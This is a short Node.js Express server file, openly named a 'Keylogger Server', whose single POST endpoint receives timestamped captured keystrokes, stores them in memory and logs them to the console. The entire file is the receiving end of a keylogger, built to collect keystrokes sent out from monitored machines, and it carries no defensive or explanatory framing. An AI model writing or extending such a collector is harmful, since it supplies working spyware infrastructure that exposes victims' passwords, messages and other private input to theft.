const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

// Simple storage (in-memory). Replace with a DB later if you want.
const logs = [];

// Middleware to parse the JSON body
app.use(express.json());

// Endpoint to receive keylogs
app.post('/api/log', (req, res) => {
  const { timestamp, keys } = req.body;
  const entry = {
    timestamp: timestamp,
    keys: keys
  };
  logs.push(entry);
  console.log(`Received Log: ${JSON.stringify(entry)}`);
  res.json({ success: true });
});

app.listen(port, () => {
  console.log(`Keylogger Server running on port ${port}`);
});
